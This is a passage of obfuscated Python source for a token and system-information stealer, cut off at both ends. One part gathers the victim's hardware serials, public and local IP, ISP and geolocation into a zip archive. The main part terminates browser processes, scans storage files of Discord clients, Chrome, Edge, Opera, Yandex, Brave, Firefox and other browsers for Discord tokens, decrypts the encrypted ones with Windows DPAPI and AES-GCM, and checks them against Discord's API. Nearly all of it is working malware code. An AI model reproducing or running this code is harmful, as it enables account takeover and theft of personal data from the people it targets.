 - System SKU                : {ZYBEKKMTGEQGGGMHZRLFXYPXUNBJOFYNXNUEKFZHGDEIOSXAYMHYYRRDRTJSHJMKFTZLEDYXRAWPCYEIGDRXXYTKSHWOMXJC}
 - Oem String Serial Number  : {HFTQQBEHSNJNZEMGMSISAYVQPDACYVSZSTMOAGSRCTCYRXIBIRGTJCZMHFGZCSHGYRUCUYS}
 - Asset Tag Serial Number   : {WMHSGRGAALHOOFWQXTPEPBXXWSHPYGFAGJVRXKMATVAABXSTKKZPLTLVQKCTYLNDQUBIHVEKQFY}

Ip:
 - Public : {KTADSZROIQVKXEVFBLKTMAGPFKZLGWVYPRQRKMCLSUTTEQWCFMMQK}
 - Local  : {ONUWOMSQHOFNGAJOLHPJRHENDOCBOGTVEHKMCDAOCGZZSEHPHMWPQZVAQHNPMJBYFUKELXJNVBCWBZINXOHYDNOGHBRPNO}

Ip Information:
 - Isp : {FKSRIHDMYJORTTBNRUVOALIAVHEHWPAMDKPTQQWFEGSHPNJSPGKAFAPLINXIXKIIWJOTLXEVBTJWBLORKTWYG}
 - Org : {QPSIUITEKWVZENVSKCXUNQCABFKTOXAWQEQQODLHBXWGQILSPOTKXNYKUZAXIOLBBKRUMZDLKSHWLFJKVATSAGKVBHLRKORJ}
 - As  : {OZQZGSRDYJTLQSYCRMKTQLNAAADTWNUJAHSAFDMHUJOZUVNMMHXAAN}

Ip Location:
 - Country   : {IZZJAQZOZHSBDTUMXERDSSWRZRIQUZMOYEECNEELVYKBECMGRZPLAHMHVPXHRRKTLHFQUMFNIKWDBXS} ({IZZJAQZOZHSBDTUMXERDSSWRZRIQUZMOYEECNEELVYKBECMGRZPLAHMHVPXHRRKTLHFQUMFNIKWDBXS_code})
 - Region    : {UDFCVQOTGNMWLSYIUZBFPHSLMKQGCZZKOVDXVGUGOVEFUYADQLGYNFUTOJYNAMAEEOPPMCK} ({UDFCVQOTGNMWLSYIUZBFPHSLMKQGCZZKOVDXVGUGOVEFUYADQLGYNFUTOJYNAMAEEOPPMCK_code})
 - Zip       : {KETVIBCYFJGZEGOTHBIYGXQLRVKUNWUVYZWRUSQAYESLSYLUIBXHMZFYTCTHT}
 - City      : {KSDVXMCFQOTLVGHQKCWSMUUKBGZYBSCDOZUERYSQEJQEBTAHZYJIEUXPUHNPHERQEYNVJAHUOLIYEAHGPXNXRPUQEB}
 - Timezone  : {CPCKCNKVNATABZXGSVSHNQMUWXDKAVKAOMROJBUGRAUAXTCWXC}
 - Longitude : {WPQMKFQPSCXNIERUVFAXSRKZFRNXNVTODCNAFNGAESAAFQCFQCNBDUAWYUQUIMFLJIWRRIOVALGPPCMTU}
 - Latitude  : {OAIEBEZNWYFXHUXCNXCWCCBGHLKPGLRMEBFHTIEAOZIPHWVQRTYIAZQQPXQBJ}
"""
    FAQFKQETPMMHNCXMLSXODEEUIKIFIYOPYLVTKFHMSLQKOMQRGWQRXTDQA.writestr("System Info.txt", WRMQQTMXNZZEPBZTYAEOMDFTDYQZMWDRJGTDMODEQIWUGOXXGAFRUAVNF)

    return MYQFDSFWZGRDZPQAECMBQGECXSHHFRHFZVYBBDYNYBDWPLCPOL_system_info

def GNYZEKGSTOHYMBYRTEOHPWHOGUUSTSTFUPORCSZTQAIHZSFZDYWCGIP(FAQFKQETPMMHNCXMLSXODEEUIKIFIYOPYLVTKFHMSLQKOMQRGWQRXTDQA):
    import os
    import re
    import json
    import base64
    import requests
    import psutil
    from Cryptodome.Cipher import AES
    from win32crypt import CryptUnprotectData

    ARTQNEVRCYQMBIADRKLZDNMXBMDBLIHSRBWPWPUEPGFXSNXBLSTVDFQYJEEJXIPKRKSOVQHHRZ = ""
    PBSVRSJXSOYUSWEJJDBDEMMTTBPMSFBXDRCYZPHKRIXDCXIGGHTPBKFFTHCERIVLHZCFJUQNIJYFOLCNAZBIHEEQD = 0

    def EGISOXAJDUTIBDBMKOIGRYUARNHGVXBMZATXOKBEKARKCJZFOAGZBWFYYPXQBANPSTUUL():  
        RMHHDUSDTQSZEMUKYEDCBLGQNJYUQZXMGFLIBPPAOTCAWFNBSGHCEBLUAZIBQSGVJOIUAJBNBMSKOEB = "https://discord.com/api/v9/users/@me"
        IUAEOYTDSKESGWDRYNQTALDXWCGJDDONCWXEGRHOKRKFMVWPUNTOBBIUUULA = r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}"
        IUAEOYTDSKESGWDRYNQTALDXWCGJDDONCWXEGRHOKRKFMVWPUNTOBBIUUULA_enc = r"dQw4w9WgXcQ:[^\"]*"
        PAABVFPBZXRBGLWHIZFDMBBRBKQHACTHVHVNLPIXPNPJYIWCWMZGNNAESRYTBNEBKNZRADMRBHFSXAVAWNEC = []
        HHIMTITIESWYKRTHIYTYBBYMXZDXZQKZDLLQWVEPTMGBJRUARCTSAZJQDMXZNRQIAVAJPVBYOBZFJWCEFYSBCUHHXEPEJETIDZB = []
        VBHRVFMVDQDHNAZJDPQLUKMJXEBWLUGTMXHQWZSXMOEUSMUAWPXURHZPACRWQLUCOZVWUNLILAZWDXGSI = {}

        YIKOETNTWCMWZZJQKOXTXPJHWTCRHAGODFHDXYDZGBSUXJACOTQSTAFTUJZXGUHCBTFXPPXJFYO = [
            ("Discord",                os.path.join(QZJGRLCPSSTPMQYKMUKBDFPCYLUDEBLVXIOTDJTSXFIBTZEIFOISTAGAWSAADVLWIWT, "discord", "Local Storage", "leveldb"),                                                  ""),
            ("Discord Canary",         os.path.join(QZJGRLCPSSTPMQYKMUKBDFPCYLUDEBLVXIOTDJTSXFIBTZEIFOISTAGAWSAADVLWIWT, "discordcanary", "Local Storage", "leveldb"),                                            ""),
            ("Lightcord",              os.path.join(QZJGRLCPSSTPMQYKMUKBDFPCYLUDEBLVXIOTDJTSXFIBTZEIFOISTAGAWSAADVLWIWT, "Lightcord", "Local Storage", "leveldb"),                                                ""),
            ("Discord PTB",            os.path.join(QZJGRLCPSSTPMQYKMUKBDFPCYLUDEBLVXIOTDJTSXFIBTZEIFOISTAGAWSAADVLWIWT, "discordptb", "Local Storage", "leveldb"),                                               ""),
            ("Opera",                  os.path.join(QZJGRLCPSSTPMQYKMUKBDFPCYLUDEBLVXIOTDJTSXFIBTZEIFOISTAGAWSAADVLWIWT, "Opera Software", "Opera Stable", "Local Storage", "leveldb"),                           "opera.exe"),
            ("Opera GX",               os.path.join(QZJGRLCPSSTPMQYKMUKBDFPCYLUDEBLVXIOTDJTSXFIBTZEIFOISTAGAWSAADVLWIWT, "Opera Software", "Opera GX Stable", "Local Storage", "leveldb"),                        "opera.exe"),
            ("Opera Neon",             os.path.join(QZJGRLCPSSTPMQYKMUKBDFPCYLUDEBLVXIOTDJTSXFIBTZEIFOISTAGAWSAADVLWIWT, "Opera Software", "Opera Neon", "Local Storage", "leveldb"),                             "opera.exe"),
            ("Amigo",                  os.path.join(AFDGNVEZEWLZNNNPXUMVWZAXDURXGBOPYGULVEXPWGQSIGNQZSQUEZODIQSW,   "Amigo", "User Data", "Local Storage", "leveldb"),                                       "amigo.exe"),
            ("Torch",                  os.path.join(AFDGNVEZEWLZNNNPXUMVWZAXDURXGBOPYGULVEXPWGQSIGNQZSQUEZODIQSW,   "Torch", "User Data", "Local Storage", "leveldb"),                                       "torch.exe"),
            ("Kometa",                 os.path.join(AFDGNVEZEWLZNNNPXUMVWZAXDURXGBOPYGULVEXPWGQSIGNQZSQUEZODIQSW,   "Kometa", "User Data", "Local Storage", "leveldb"),                                      "kometa.exe"),
            ("Orbitum",                os.path.join(AFDGNVEZEWLZNNNPXUMVWZAXDURXGBOPYGULVEXPWGQSIGNQZSQUEZODIQSW,   "Orbitum", "User Data", "Local Storage", "leveldb"),                                     "orbitum.exe"),
            ("CentBrowser",            os.path.join(AFDGNVEZEWLZNNNPXUMVWZAXDURXGBOPYGULVEXPWGQSIGNQZSQUEZODIQSW,   "CentBrowser", "User Data", "Local Storage", "leveldb"),                                 "centbrowser.exe"),
            ("7Star",                  os.path.join(AFDGNVEZEWLZNNNPXUMVWZAXDURXGBOPYGULVEXPWGQSIGNQZSQUEZODIQSW,   "7Star", "7Star", "User Data", "Local Storage", "leveldb"),                              "7star.exe"),
            ("Sputnik",                os.path.join(AFDGNVEZEWLZNNNPXUMVWZAXDURXGBOPYGULVEXPWGQSIGNQZSQUEZODIQSW,   "Sputnik", "Sputnik", "User Data", "Local Storage", "leveldb"),                          "sputnik.exe"),
            ("Vivaldi",                os.path.join(AFDGNVEZEWLZNNNPXUMVWZAXDURXGBOPYGULVEXPWGQSIGNQZSQUEZODIQSW,   "Vivaldi", "User Data", "Default", "Local Storage", "leveldb"),                          "vivaldi.exe"),
            ("Google Chrome",          os.path.join(AFDGNVEZEWLZNNNPXUMVWZAXDURXGBOPYGULVEXPWGQSIGNQZSQUEZODIQSW,   "Google", "Chrome", "User Data", "Default", "Local Storage", "leveldb"),                 "chrome.exe"),
            ("Google Chrome",          os.path.join(AFDGNVEZEWLZNNNPXUMVWZAXDURXGBOPYGULVEXPWGQSIGNQZSQUEZODIQSW,   "Google", "Chrome", "User Data", "Profile 1", "Local Storage", "leveldb"),               "chrome.exe"),
            ("Google Chrome",          os.path.join(AFDGNVEZEWLZNNNPXUMVWZAXDURXGBOPYGULVEXPWGQSIGNQZSQUEZODIQSW,   "Google", "Chrome", "User Data", "Profile 2", "Local Storage", "leveldb"),               "chrome.exe"),
            ("Google Chrome",          os.path.join(AFDGNVEZEWLZNNNPXUMVWZAXDURXGBOPYGULVEXPWGQSIGNQZSQUEZODIQSW,   "Google", "Chrome", "User Data", "Profile 3", "Local Storage", "leveldb"),               "chrome.exe"),
            ("Google Chrome",          os.path.join(AFDGNVEZEWLZNNNPXUMVWZAXDURXGBOPYGULVEXPWGQSIGNQZSQUEZODIQSW,   "Google", "Chrome", "User Data", "Profile 4", "Local Storage", "leveldb"),               "chrome.exe"),
            ("Google Chrome",          os.path.join(AFDGNVEZEWLZNNNPXUMVWZAXDURXGBOPYGULVEXPWGQSIGNQZSQUEZODIQSW,   "Google", "Chrome", "User Data", "Profile 5", "Local Storage", "leveldb"),               "chrome.exe"),
            ("Google Chrome SxS",      os.path.join(AFDGNVEZEWLZNNNPXUMVWZAXDURXGBOPYGULVEXPWGQSIGNQZSQUEZODIQSW,   "Google", "Chrome SxS", "User Data", "Default", "Local Storage", "leveldb"),             "chrome.exe"),
            ("Google Chrome Beta",     os.path.join(AFDGNVEZEWLZNNNPXUMVWZAXDURXGBOPYGULVEXPWGQSIGNQZSQUEZODIQSW,   "Google", "Chrome Beta", "User Data", "Default", "Local Storage", "leveldb"),            "chrome.exe"),
            ("Google Chrome Dev",      os.path.join(AFDGNVEZEWLZNNNPXUMVWZAXDURXGBOPYGULVEXPWGQSIGNQZSQUEZODIQSW,   "Google", "Chrome Dev", "User Data", "Default", "Local Storage", "leveldb"),             "chrome.exe"),
            ("Google Chrome Unstable", os.path.join(AFDGNVEZEWLZNNNPXUMVWZAXDURXGBOPYGULVEXPWGQSIGNQZSQUEZODIQSW,   "Google", "Chrome Unstable", "User Data", "Default", "Local Storage", "leveldb"),        "chrome.exe"),
            ("Google Chrome Canary",   os.path.join(AFDGNVEZEWLZNNNPXUMVWZAXDURXGBOPYGULVEXPWGQSIGNQZSQUEZODIQSW,   "Google", "Chrome Canary", "User Data", "Default", "Local Storage", "leveldb"),          "chrome.exe"),
            ("Epic Privacy Browser",   os.path.join(AFDGNVEZEWLZNNNPXUMVWZAXDURXGBOPYGULVEXPWGQSIGNQZSQUEZODIQSW,   "Epic Privacy Browser", "User Data", "Local Storage", "leveldb"),                        "epic.exe"),
            ("Microsoft Edge",         os.path.join(AFDGNVEZEWLZNNNPXUMVWZAXDURXGBOPYGULVEXPWGQSIGNQZSQUEZODIQSW,   "Microsoft", "Edge", "User Data", "Default", "Local Storage", "leveldb"),                "msedge.exe"),
            ("Uran",                   os.path.join(AFDGNVEZEWLZNNNPXUMVWZAXDURXGBOPYGULVEXPWGQSIGNQZSQUEZODIQSW,   "uCozMedia", "Uran", "User Data", "Default", "Local Storage", "leveldb"),                "uran.exe"),
            ("Yandex",                 os.path.join(AFDGNVEZEWLZNNNPXUMVWZAXDURXGBOPYGULVEXPWGQSIGNQZSQUEZODIQSW,   "Yandex", "YandexBrowser", "User Data", "Default", "Local Storage", "leveldb"),          "yandex.exe"),
            ("Yandex Canary",          os.path.join(AFDGNVEZEWLZNNNPXUMVWZAXDURXGBOPYGULVEXPWGQSIGNQZSQUEZODIQSW,   "Yandex", "YandexBrowserCanary", "User Data", "Default", "Local Storage", "leveldb"),    "yandex.exe"),
            ("Yandex Developer",       os.path.join(AFDGNVEZEWLZNNNPXUMVWZAXDURXGBOPYGULVEXPWGQSIGNQZSQUEZODIQSW,   "Yandex", "YandexBrowserDeveloper", "User Data", "Default", "Local Storage", "leveldb"), "yandex.exe"),
            ("Yandex Beta",            os.path.join(AFDGNVEZEWLZNNNPXUMVWZAXDURXGBOPYGULVEXPWGQSIGNQZSQUEZODIQSW,   "Yandex", "YandexBrowserBeta", "User Data", "Default", "Local Storage", "leveldb"),      "yandex.exe"),
            ("Yandex Tech",            os.path.join(AFDGNVEZEWLZNNNPXUMVWZAXDURXGBOPYGULVEXPWGQSIGNQZSQUEZODIQSW,   "Yandex", "YandexBrowserTech", "User Data", "Default", "Local Storage", "leveldb"),      "yandex.exe"),
            ("Yandex SxS",             os.path.join(AFDGNVEZEWLZNNNPXUMVWZAXDURXGBOPYGULVEXPWGQSIGNQZSQUEZODIQSW,   "Yandex", "YandexBrowserSxS", "User Data", "Default", "Local Storage", "leveldb"),       "yandex.exe"),
            ("Brave",                  os.path.join(AFDGNVEZEWLZNNNPXUMVWZAXDURXGBOPYGULVEXPWGQSIGNQZSQUEZODIQSW,   "BraveSoftware", "Brave-Browser", "User Data", "Default", "Local Storage", "leveldb"),   "brave.exe"),
            ("Iridium",                os.path.join(AFDGNVEZEWLZNNNPXUMVWZAXDURXGBOPYGULVEXPWGQSIGNQZSQUEZODIQSW,   "Iridium", "User Data", "Default", "Local Storage", "leveldb"),                          "iridium.exe"),
        ]

        
        try:
             for HNIDWHPYTSGEPQXYXJJNVPYTBECAGMLTLGGYQPLIIFYGKTULYNEJMZDJBFW, ZOPHLKAPPQRVFVIVUNUPDBZSMSYINIWKQTUXUQOJTNGKPJUAQPNZUWUZHHQFKEUATPTUNHNWJGQFYMJFYTNZITRLGVKVLG, v4r_proc_name in YIKOETNTWCMWZZJQKOXTXPJHWTCRHAGODFHDXYDZGBSUXJACOTQSTAFTUJZXGUHCBTFXPPXJFYO:
                for v4r_proc in psutil.process_iter(['pid', 'name']):
                    try:
                        if v4r_proc.name().lower() == v4r_proc_name.lower():
                            v4r_proc.terminate()
                    except: pass
        except: pass

        for HNIDWHPYTSGEPQXYXJJNVPYTBECAGMLTLGGYQPLIIFYGKTULYNEJMZDJBFW, ZOPHLKAPPQRVFVIVUNUPDBZSMSYINIWKQTUXUQOJTNGKPJUAQPNZUWUZHHQFKEUATPTUNHNWJGQFYMJFYTNZITRLGVKVLG, v4r_proc_name in YIKOETNTWCMWZZJQKOXTXPJHWTCRHAGODFHDXYDZGBSUXJACOTQSTAFTUJZXGUHCBTFXPPXJFYO:
            if not os.path.exists(ZOPHLKAPPQRVFVIVUNUPDBZSMSYINIWKQTUXUQOJTNGKPJUAQPNZUWUZHHQFKEUATPTUNHNWJGQFYMJFYTNZITRLGVKVLG):

                continue
            UCIKCXVVDUPTUJFHARHOQELHTKTPMXNKATEXGFDWLKFBPZHVOKYQKYITBZHNG = HNIDWHPYTSGEPQXYXJJNVPYTBECAGMLTLGGYQPLIIFYGKTULYNEJMZDJBFW.replace(" ", "").lower()
            if "cord" in ZOPHLKAPPQRVFVIVUNUPDBZSMSYINIWKQTUXUQOJTNGKPJUAQPNZUWUZHHQFKEUATPTUNHNWJGQFYMJFYTNZITRLGVKVLG:
                if not os.path.exists(os.path.join(QZJGRLCPSSTPMQYKMUKBDFPCYLUDEBLVXIOTDJTSXFIBTZEIFOISTAGAWSAADVLWIWT, UCIKCXVVDUPTUJFHARHOQELHTKTPMXNKATEXGFDWLKFBPZHVOKYQKYITBZHNG, 'Local State')):
                    continue
                for v4r_file_name in os.listdir(ZOPHLKAPPQRVFVIVUNUPDBZSMSYINIWKQTUXUQOJTNGKPJUAQPNZUWUZHHQFKEUATPTUNHNWJGQFYMJFYTNZITRLGVKVLG):
                    if v4r_file_name[-3:] not in ["log", "ldb"]:
                        continue
                    SJTTXIJUQSNAMCIXUPARKIEIOJPUAAKGCIPHEYDBHWOTPDWDZPWRTCPEUMOROJQKJEHUJKXK = os.path.join(ZOPHLKAPPQRVFVIVUNUPDBZSMSYINIWKQTUXUQOJTNGKPJUAQPNZUWUZHHQFKEUATPTUNHNWJGQFYMJFYTNZITRLGVKVLG, v4r_file_name)
                    if os.path.exists(SJTTXIJUQSNAMCIXUPARKIEIOJPUAAKGCIPHEYDBHWOTPDWDZPWRTCPEUMOROJQKJEHUJKXK):
                        with open(SJTTXIJUQSNAMCIXUPARKIEIOJPUAAKGCIPHEYDBHWOTPDWDZPWRTCPEUMOROJQKJEHUJKXK, errors='ignore') as v4r_file:
                            for v4r_line in v4r_file:
                                for y in re.findall(IUAEOYTDSKESGWDRYNQTALDXWCGJDDONCWXEGRHOKRKFMVWPUNTOBBIUUULA_enc, v4r_line.strip()):
                                    IOODFCKPLGHLNXBFMDOXFPNGLZJYKYZNXDUNJKODMPRHCPVDQXLIBR = SCHRFXRJUBNFDPPPZVCINWJMZHOCWZVXJOFQZRTSFXVTFRTPQSHZJROBCVal(base64.b64decode(y.split('dQw4w9WgXcQ:')[1]), WHUYWXCTAIGIZTHPEZQPDWVVOAQALWRVRVHJMFPUGGXJDLEANZUXRQPQFMZZOGYUDOFZNVHAPQVYHEPSHJM(os.path.join(QZJGRLCPSSTPMQYKMUKBDFPCYLUDEBLVXIOTDJTSXFIBTZEIFOISTAGAWSAADVLWIWT, UCIKCXVVDUPTUJFHARHOQELHTKTPMXNKATEXGFDWLKFBPZHVOKYQKYITBZHNG, 'Local State')))
                                    if RVZNLUQGCZRBVQYQMPZAKSCTKHERNELWIXUHRIPFDWDCMEMPXKWZ(IOODFCKPLGHLNXBFMDOXFPNGLZJYKYZNXDUNJKODMPRHCPVDQXLIBR, RMHHDUSDTQSZEMUKYEDCBLGQNJYUQZXMGFLIBPPAOTCAWFNBSGHCEBLUAZIBQSGVJOIUAJBNBMSKOEB):
                                        RRBIWJNFGMVNQESRTLIPTGJOBSJFXMMUQRJYLYDATOSSSQEQSNUMAK = requests.get(RMHHDUSDTQSZEMUKYEDCBLGQNJYUQZXMGFLIBPPAOTCAWFNBSGHCEBLUAZIBQSGVJOIUAJBNBMSKOEB, headers={'Authorization': IOODFCKPLGHLNXBFMDOXFPNGLZJYKYZNXDUNJKODMPRHCPVDQXLIBR}).json()['id']
                                        if RRBIWJNFGMVNQESRTLIPTGJOBSJFXMMUQRJYLYDATOSSSQEQSNUMAK not in HHIMTITIESWYKRTHIYTYBBYMXZDXZQKZDLLQWVEPTMGBJRUARCTSAZJQDMXZNRQIAVAJPVBYOBZFJWCEFYSBCUHHXEPEJETIDZB:
                                            PAABVFPBZXRBGLWHIZFDMBBRBKQHACTHVHVNLPIXPNPJYIWCWMZGNNAESRYTBNEBKNZRADMRBHFSXAVAWNEC.append(IOODFCKPLGHLNXBFMDOXFPNGLZJYKYZNXDUNJKODMPRHCPVDQXLIBR)
                                            HHIMTITIESWYKRTHIYTYBBYMXZDXZQKZDLLQWVEPTMGBJRUARCTSAZJQDMXZNRQIAVAJPVBYOBZFJWCEFYSBCUHHXEPEJETIDZB.append(RRBIWJNFGMVNQESRTLIPTGJOBSJFXMMUQRJYLYDATOSSSQEQSNUMAK)
                                            VBHRVFMVDQDHNAZJDPQLUKMJXEBWLUGTMXHQWZSXMOEUSMUAWPXURHZPACRWQLUCOZVWUNLILAZWDXGSI[IOODFCKPLGHLNXBFMDOXFPNGLZJYKYZNXDUNJKODMPRHCPVDQXLIBR] = (HNIDWHPYTSGEPQXYXJJNVPYTBECAGMLTLGGYQPLIIFYGKTULYNEJMZDJBFW, SJTTXIJUQSNAMCIXUPARKIEIOJPUAAKGCIPHEYDBHWOTPDWDZPWRTCPEUMOROJQKJEHUJKXK)
            else:
                for v4r_file_name in os.listdir(ZOPHLKAPPQRVFVIVUNUPDBZSMSYINIWKQTUXUQOJTNGKPJUAQPNZUWUZHHQFKEUATPTUNHNWJGQFYMJFYTNZITRLGVKVLG):
                    if v4r_file_name[-3:] not in ["log", "ldb"]:
                        continue
                    SJTTXIJUQSNAMCIXUPARKIEIOJPUAAKGCIPHEYDBHWOTPDWDZPWRTCPEUMOROJQKJEHUJKXK = os.path.join(ZOPHLKAPPQRVFVIVUNUPDBZSMSYINIWKQTUXUQOJTNGKPJUAQPNZUWUZHHQFKEUATPTUNHNWJGQFYMJFYTNZITRLGVKVLG, v4r_file_name)
                    if os.path.exists(SJTTXIJUQSNAMCIXUPARKIEIOJPUAAKGCIPHEYDBHWOTPDWDZPWRTCPEUMOROJQKJEHUJKXK):
                        with open(SJTTXIJUQSNAMCIXUPARKIEIOJPUAAKGCIPHEYDBHWOTPDWDZPWRTCPEUMOROJQKJEHUJKXK, errors='ignore') as v4r_file:
                            for v4r_line in v4r_file:
                                for IOODFCKPLGHLNXBFMDOXFPNGLZJYKYZNXDUNJKODMPRHCPVDQXLIBR in re.findall(IUAEOYTDSKESGWDRYNQTALDXWCGJDDONCWXEGRHOKRKFMVWPUNTOBBIUUULA, v4r_line.strip()):
                                    if RVZNLUQGCZRBVQYQMPZAKSCTKHERNELWIXUHRIPFDWDCMEMPXKWZ(IOODFCKPLGHLNXBFMDOXFPNGLZJYKYZNXDUNJKODMPRHCPVDQXLIBR, RMHHDUSDTQSZEMUKYEDCBLGQNJYUQZXMGFLIBPPAOTCAWFNBSGHCEBLUAZIBQSGVJOIUAJBNBMSKOEB):
                                        RRBIWJNFGMVNQESRTLIPTGJOBSJFXMMUQRJYLYDATOSSSQEQSNUMAK = requests.get(RMHHDUSDTQSZEMUKYEDCBLGQNJYUQZXMGFLIBPPAOTCAWFNBSGHCEBLUAZIBQSGVJOIUAJBNBMSKOEB, headers={'Authorization': IOODFCKPLGHLNXBFMDOXFPNGLZJYKYZNXDUNJKODMPRHCPVDQXLIBR}).json()['id']
                                        if RRBIWJNFGMVNQESRTLIPTGJOBSJFXMMUQRJYLYDATOSSSQEQSNUMAK not in HHIMTITIESWYKRTHIYTYBBYMXZDXZQKZDLLQWVEPTMGBJRUARCTSAZJQDMXZNRQIAVAJPVBYOBZFJWCEFYSBCUHHXEPEJETIDZB:
                                            PAABVFPBZXRBGLWHIZFDMBBRBKQHACTHVHVNLPIXPNPJYIWCWMZGNNAESRYTBNEBKNZRADMRBHFSXAVAWNEC.append(IOODFCKPLGHLNXBFMDOXFPNGLZJYKYZNXDUNJKODMPRHCPVDQXLIBR)
                                            HHIMTITIESWYKRTHIYTYBBYMXZDXZQKZDLLQWVEPTMGBJRUARCTSAZJQDMXZNRQIAVAJPVBYOBZFJWCEFYSBCUHHXEPEJETIDZB.append(RRBIWJNFGMVNQESRTLIPTGJOBSJFXMMUQRJYLYDATOSSSQEQSNUMAK)
                                            VBHRVFMVDQDHNAZJDPQLUKMJXEBWLUGTMXHQWZSXMOEUSMUAWPXURHZPACRWQLUCOZVWUNLILAZWDXGSI[IOODFCKPLGHLNXBFMDOXFPNGLZJYKYZNXDUNJKODMPRHCPVDQXLIBR] = (HNIDWHPYTSGEPQXYXJJNVPYTBECAGMLTLGGYQPLIIFYGKTULYNEJMZDJBFW, SJTTXIJUQSNAMCIXUPARKIEIOJPUAAKGCIPHEYDBHWOTPDWDZPWRTCPEUMOROJQKJEHUJKXK)

        if os.path.exists(os.path.join(QZJGRLCPSSTPMQYKMUKBDFPCYLUDEBLVXIOTDJTSXFIBTZEIFOISTAGAWSAADVLWIWT, "Mozilla", "Firefox", "Profiles")):
            for ZOPHLKAPPQRVFVIVUNUPDBZSMSYINIWKQTUXUQOJTNGKPJUAQPNZUWUZHHQFKEUATPTUNHNWJGQFYMJFYTNZITRLGVKVLG, _, v4r_files in os.walk(os.path.join(QZJGRLCPSSTPMQYKMUKBDFPCYLUDEBLVXIOTDJTSXFIBTZEIFOISTAGAWSAADVLWIWT, "Mozilla", "Firefox", "Profiles")):
                for v4r__file in v4r_files:
                    if v4r__file.endswith('.sqlite'):
                        with open(os.path.join(ZOPHLKAPPQRVFVIVUNUPDBZSMSYINIWKQTUXUQOJTNGKPJUAQPNZUWUZHHQFKEUATPTUNHNWJGQFYMJFYTNZITRLGVKVLG, v4r__file), errors='ignore') as v4r_file:
                            for v4r_line in v4r_file:
                                for IOODFCKPLGHLNXBFMDOXFPNGLZJYKYZNXDUNJKODMPRHCPVDQXLIBR in re.findall(IUAEOYTDSKESGWDRYNQTALDXWCGJDDONCWXEGRHOKRKFMVWPUNTOBBIUUULA, v4r_line.strip()):
                                    if RVZNLUQGCZRBVQYQMPZAKSCTKHERNELWIXUHRIPFDWDCMEMPXKWZ(IOODFCKPLGHLNXBFMDOXFPNGLZJYKYZNXDUNJKODMPRHCPVDQXLIBR, RMHHDUSDTQSZEMUKYEDCBLGQNJYUQZXMGFLIBPPAOTCAWFNBSGHCEBLUAZIBQSGVJOIUAJBNBMSKOEB):
                                        RRBIWJNFGMVNQESRTLIPTGJOBSJFXMMUQRJYLYDATOSSSQEQSNUMAK = requests.get(RMHHDUSDTQSZEMUKYEDCBLGQNJYUQZXMGFLIBPPAOTCAWFNBSGHCEBLUAZIBQSGVJOIUAJBNBMSKOEB, headers={'Authorization': IOODFCKPLGHLNXBFMDOXFPNGLZJYKYZNXDUNJKODMPRHCPVDQXLIBR}).json()['id']
                                        if RRBIWJNFGMVNQESRTLIPTGJOBSJFXMMUQRJYLYDATOSSSQEQSNUMAK not in HHIMTITIESWYKRTHIYTYBBYMXZDXZQKZDLLQWVEPTMGBJRUARCTSAZJQDMXZNRQIAVAJPVBYOBZFJWCEFYSBCUHHXEPEJETIDZB:
                                            PAABVFPBZXRBGLWHIZFDMBBRBKQHACTHVHVNLPIXPNPJYIWCWMZGNNAESRYTBNEBKNZRADMRBHFSXAVAWNEC.append(IOODFCKPLGHLNXBFMDOXFPNGLZJYKYZNXDUNJKODMPRHCPVDQXLIBR)
                                            HHIMTITIESWYKRTHIYTYBBYMXZDXZQKZDLLQWVEPTMGBJRUARCTSAZJQDMXZNRQIAVAJPVBYOBZFJWCEFYSBCUHHXEPEJETIDZB.append(RRBIWJNFGMVNQESRTLIPTGJOBSJFXMMUQRJYLYDATOSSSQEQSNUMAK)
                                            VBHRVFMVDQDHNAZJDPQLUKMJXEBWLUGTMXHQWZSXMOEUSMUAWPXURHZPACRWQLUCOZVWUNLILAZWDXGSI[IOODFCKPLGHLNXBFMDOXFPNGLZJYKYZNXDUNJKODMPRHCPVDQXLIBR] = ('Firefox', os.path.join(ZOPHLKAPPQRVFVIVUNUPDBZSMSYINIWKQTUXUQOJTNGKPJUAQPNZUWUZHHQFKEUATPTUNHNWJGQFYMJFYTNZITRLGVKVLG, v4r__file))
        return PAABVFPBZXRBGLWHIZFDMBBRBKQHACTHVHVNLPIXPNPJYIWCWMZGNNAESRYTBNEBKNZRADMRBHFSXAVAWNEC, VBHRVFMVDQDHNAZJDPQLUKMJXEBWLUGTMXHQWZSXMOEUSMUAWPXURHZPACRWQLUCOZVWUNLILAZWDXGSI

    def RVZNLUQGCZRBVQYQMPZAKSCTKHERNELWIXUHRIPFDWDCMEMPXKWZ(IOODFCKPLGHLNXBFMDOXFPNGLZJYKYZNXDUNJKODMPRHCPVDQXLIBR, RMHHDUSDTQSZEMUKYEDCBLGQNJYUQZXMGFLIBPPAOTCAWFNBSGHCEBLUAZIBQSGVJOIUAJBNBMSKOEB):
        return requests.get(RMHHDUSDTQSZEMUKYEDCBLGQNJYUQZXMGFLIBPPAOTCAWFNBSGHCEBLUAZIBQSGVJOIUAJBNBMSKOEB, headers={'Authorization': IOODFCKPLGHLNXBFMDOXFPNGLZJYKYZNXDUNJKODMPRHCPVDQXLIBR}).status_code == 200

    def SCHRFXRJUBNFDPPPZVCINWJMZHOCWZVXJOFQZRTSFXVTFRTPQSHZJROBCVal(BBOICSGGKPLEPSWJSCKAGHQHYTWSYABWSGWVOQKJBCHJSQNQMYLGKWEERNJEGMEQOXOMZFTOT, JNJCPELVFICWQKJJSVPNELCZRXTXZWMZUKUXFABAPSEURUEQXDOASZPZUBGWTEGTDIIIIX):
        YJQBPSPMETOSLESRFOKRHEHMUWHTQRREWELXEDODFFOTPUIVVVTSUQOFQGSG = BBOICSGGKPLEPSWJSCKAGHQHYTWSYABWSGWVOQKJBCHJSQNQMYLGKWEERNJEGMEQOXOMZFTOT[3:15]
        SIGZZBKBAMKEZSMEQQEAYVHSNTEXTADOSQQIUWYRGRKSQTQZSGNMOZRVSVCFX = BBOICSGGKPLEPSWJSCKAGHQHYTWSYABWSGWVOQKJBCHJSQNQMYLGKWEERNJEGMEQOXOMZFTOT[15:]
        VBEWVEGSIKVSVBSBLYITAXUVDRHOUEWQWXRPFCCSUZIIOXOAEOMMDIISPDKIF = AES.new(JNJCPELVFICWQKJJSVPNELCZRXTXZWMZUKUXFABAPSEURUEQXDOASZPZUBGWTEGTDIIIIX, AES.MODE_GCM, YJQBPSPMETOSLESRFOKRHEHMUWHTQRREWELXEDODFFOTPUIVVVTSUQOFQGSG)
